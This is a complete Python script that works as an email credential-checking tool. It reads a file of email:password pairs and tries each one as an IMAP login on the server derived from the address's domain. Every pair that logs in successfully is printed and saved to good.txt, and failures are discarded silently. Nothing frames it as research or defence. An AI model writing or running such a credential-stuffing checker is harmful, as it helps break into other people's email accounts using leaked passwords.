#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import imaplib
import argparse
import sys
import glob


def create_parser ():
    parser = argparse.ArgumentParser()
    parser.add_argument('inputDirectory',choices=glob.glob('*.txt'),
                    help='Path to the input directory.')
 
    return parser

def get_mail_list(path):
    mail = []
    with open(path,'r') as f:
        for line in f:
            mail.append(line.strip())

    return mail

def mail_auth(login,password):
    try:
        server = login.split('@')[1]
        mail = imaplib.IMAP4_SSL('imap.'+server)
        mail.login(login,password)

        print('%s:%s' % (login,password)) # this is a good result

        with open('good.txt','a') as f:
            f.write('%s:%s\n' % (login,password))
    except:
        pass

def main():
    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])
    mail = get_mail_list(namespace.inputDirectory)
  
    for data in mail:
        account = data.split(':')
        login = account[0]
        password = account[1]
        mail_auth(login,password)

if __name__ == '__main__':
    main()